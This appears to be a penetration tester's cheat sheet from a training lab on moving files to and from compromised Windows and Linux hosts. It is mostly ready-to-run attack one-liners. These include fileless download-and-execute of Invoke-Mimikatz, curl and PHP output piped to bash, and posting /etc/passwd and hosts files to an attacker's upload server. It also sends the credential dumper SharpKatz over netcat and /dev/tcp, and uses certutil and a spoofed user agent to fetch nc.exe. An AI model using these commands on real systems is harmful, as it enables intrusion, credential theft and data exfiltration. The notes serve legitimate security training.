# File Transfer
## Windows File Transfer Methods

**Powershell Basics**

### Powershell web download
|**Method**|	**Description**|
|----------------|-------------|
|OpenRead|	Returns the data from a resource as a Stream.|
|OpenReadAsync|	Returns the data from a resource without blocking the calling thread.|
|DownloadData|	Downloads data from a resource and returns a Byte array.|
|DownloadDataAsync|	Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|DownloadFile|	Downloads data from a resource to a local file.|
|DownloadFileAsync|	Downloads data from a resource to a local file without blocking the calling thread.|
|DownloadString|	Downloads a String from a resource and returns a String.|
|DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|

#### DownloadFile Method
**Download operations**
**Download file**

    (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

**Download file async**

    (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

#### DownloadString (filelessmethod)

    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

**pipeline input**

    (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

#### Invoke-WebRequest

    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

**Note -** *if error in the  Internet Explorer and give the error, prevent it by `-UseBasicParsing`*

*if ssl/tls error then  `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`*


### **Encoding and Decoding**
**Generate the hash of the file**

    md5sum <file_name>

**Encode file to the Base64** - window understand base64

    cat <file_name> |base64 -w 0;echo

**Decode the Base64 to get the file (in POWERSHEll)**

    [IO.File]::WriteAllBytes("<file_path>\<file_name>", [Convert]::FromBase64String("<base64_hash>"))

**Check the hash in powershell**

    Get-FileHash <file_path>\<file_name> -Algorithm md5

### Transfer File by SMB Protocol 

**Create and run the smb server on linux**

    sudo impacket-smbserver share -smb2support /tmp/smbshare

**Copy the file from server**

    copy \\<ip_of_the_server>\share\<file_name>

**Create the SMB Server with a Username and Password**

    sudo impacket-smbserver share -smb2support /tmp/smbshare -user <username> -password <password>

**Mount the SMB Server with Username and Password**

    net use n: \\192.168.220.133\share /user:<username> <password>

**Copy the file**

     copy n:\<file_name>


### By using FTP
*Installing the FTP Server Python3 Module - pyftpdlib*

    sudo pip3 install pyftpdlib

**Setting up a Python3 FTP Server**
*default port 2121 and allow loging without auth.*

    python3 -m pyftpdlib --port 21  #this is not writable
    sudo python3 -m pyftpdlib --port 21 --write   #this is writable

transfer the file with Net.WebClient (ps)

     (New-Object Net.WebClient).DownloadFile('ftp://<ipaddress>/file.txt', '<destination_path>')

**Upload Operations**
### BY using Uploadserver (python)
**Installing a Configured WebServer with Upload**

    pip3 install uploadserver

    python3 -m uploadserver

**upload the file**

    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
    Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

**Note:** *from browser also you can do by nevagating to the http://ip_address (show files/download) http://ip_address/upload (upload files)*

### by Using wsgidav and cheroot
**Configuring/install WebDav Server**

    pip install wsgidav cheroot

**start server**

    wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

**Connect it by ps.**

    dir \\192.168.49.128\DavWWWRoot

**Uploading Files using SMB**

    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
    copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\

### reverse Encoding and Decoding 
**encoding to base64 (.ps)**

    [Convert]::ToBase64String((Get-Content -path "file_path\name" -Encoding byte))

**check hash (.ps)**

    Get-FileHash "<file_path\filename>" -Algorithm MD5 | select Hash

**decode in Linux Terminal**

    echo <base64_hash> | base64 -d > <file_name>

**check the hash on Linux**

    md5sum hosts 

### send base64 by netcat 
**another way to upload file using base64**

    $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

    Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

**catch the base64 hash with netcat**

    nc -lnvp 8080

    echo <base64> | base64 -d -w 0 > hosts

## Linux File Transfer Methods
**Download operations**
### `Base64` Encoding / Decoding

**Encoding**

    cat file_name | base64 -w 0;echo 

**Decoding**

    echo -n 'base64_hash' |base64 -d > file_name

**Chech ChechSum**

    md5sum file_name

### Using `wget` and `cURL`

    wget <url> -o destination
    
    curl <url> -o destination

**Fileless Attacks Using Linux -**  *we dont need to the download the file to execute it pass the url thorugh the pipe operator.*
**Example using `wget`**

    wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

**Example using curl**

    curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

### Download with Bash (/dev/tcp)
*the shell should be bash shell and it's version is above 2.04 or 2.04*

**Connect to the Target Webserver**
  
    exec 3<>/dev/tcp/10.10.10.32/80

**HTTP GET Request**
  
    echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

**Print the Response**
  
    cat <&3

### Secure Copy (SCP)
*SSH should be installed and running (up) and it is same as copy ans cp*

**from remote to local**
    
    scp username@<ip-_address>:<file_path> <destination_path>


### **Upload Operations**
#### Python UploadServer
**start Server**

    python3 -m uploadserver

**Configure for Secure connection**

    sudo python3 -m pip install --user uploadserver

**Create a Self-Signed Certificate**

    openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

**Start the WebServer**

    sudo python3 -m uploadserver 443 --server-certificate <sertificate_path>

**upload files**

    curl -X POST https://192.168.49.128/upload -F 'files=@file1_path' -F 'files=@<file2_path>' --insecure 
    # if using self signed certificate then use (--insecure )

**Aulternative way to create server**

    //python3
    python3 -m http.server


    // python2.7
    python2.7 -m SimpleHTTPServer


    //php
    php -S 0.0.0.0:8000


    //ruby
    ruby -run -ehttpd . -p8000

**Download from the target to local**

    wget <ip_address>:<port>/<file_name>

#### By SCP

    scp <source_filepath> <username>@<ip_address>:<destination_path>

## File Transfer by programming language

python3 - download

    python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

python2 - Download

    python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

PHP Download with File_get_contents()

    php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

PHP Download with Fopen()

    php -r 'const BUFFER = 1024; $fremote = 
    fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

PHP Download a File and Pipe it to Bash

    php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash

Ruby - Download a File

     ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

Perl - Download a File

    perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

JavaSctipt (weget.js)

    var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
    WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
    WinHttpReq.Send();
    BinStream = new ActiveXObject("ADODB.Stream");
    BinStream.Type = 1;
    BinStream.Open();
    BinStream.Write(WinHttpReq.ResponseBody);
    BinStream.SaveToFile(WScript.Arguments(1));

Javascript in windows

    cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1

VBScript (wget.vbs)

    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", WScript.Arguments.Item(0), False
    xHttp.Send

    with bStrm
        .type = 1
        .open
        .write xHttp.responseBody
        .savetofile WScript.Arguments.Item(1), 2
    end with

To download into windows machine

    cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1

Upload Operations using Python3 (uploadserver)

one liner code:
    
    python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

multiliner code:

    import requests 
    URL = "http://192.168.49.128:8000/upload"
    file = open("/etc/passwd","rb")
    r = requests.post(url,files={"files":file})

## Miscellaneous File Transfer Methods
NetCat - Compromised Machine - Listening on Port 8000

    //original netcat
    nc -l -p 8000 > SharpKatz.exe

    //Ncat by nmap
    ncat -l -p 8000 --recv-only > SharpKatz.exe

Netcat - Attack Host - Sending File to Compromised machine

    //get the file to the pwd
    wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe

    //netcat
    nc -q 0 192.168.49.128 8000 < SharpKatz.exe

    //Ncat
    ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

`-q 0` and `--send-only` tell netcat to close the connection when file is transfered 


NetCat - Sending File as Input to Netcat

    sudo nc -l -p 443 -q 0 < SharpKatz.exe

Ncat - Sending File as Input to Netcat

    sudo ncat -l -p 443 --send-only < SharpKatz.exe

Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

    cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

### PowerShell Session File Transfer
*use PowerShell Remoting, aka WinRM, to perform file transfer operations. ports `TCP/5985` for HTTP and `TCP/5986` for HTTPS. To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration.*

Create a PowerShell Remoting Session to DATABASE01
    PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01

Copy samplefile.txt from our Localhost to the DATABASE01 Session

    PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

Copy DATABASE.txt from DATABASE01 Session to our Localhost

    PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

### RDP
*transfer files using RDP by copying and pasting work for both linux and windows.* 

if the above not work then mount the share with the tools like below:

Mounting a Linux Folder Using rdesktop
    
    rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'

Mounting a Linux Folder Using xfreerdp

    xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

**Note-** *To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.*


# Protacting File Transfer
## Encryption by Powershell

**Get the file to the machine**
    [Invoke-AESEncryption](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1)

**Import Module Invoke-AESEncryption.ps1**

    Import-Module .\Invoke-AESEncryption.ps1

**Encrypt the file or string**

    Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

Decrypt:

    Invoke-AESEncryption -Mode Decrypt -Key "p4ssw0rd" -Path .\scan-results.txt.aes

## Encryption on Linux(openssl)
- To encrypt a file using openssl we can select different ciphers

Encrypt
    
    openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

Decrypt

    openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd

# Living off The Land

[LOLBins for windows](https://lolbas-project.github.io/)

[GTFOBins for linux](https://gtfobins.github.io/)

## Used for 
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

## Certutil

**Download**
    
    certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe

Request with Chrome User Agent

    $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"

    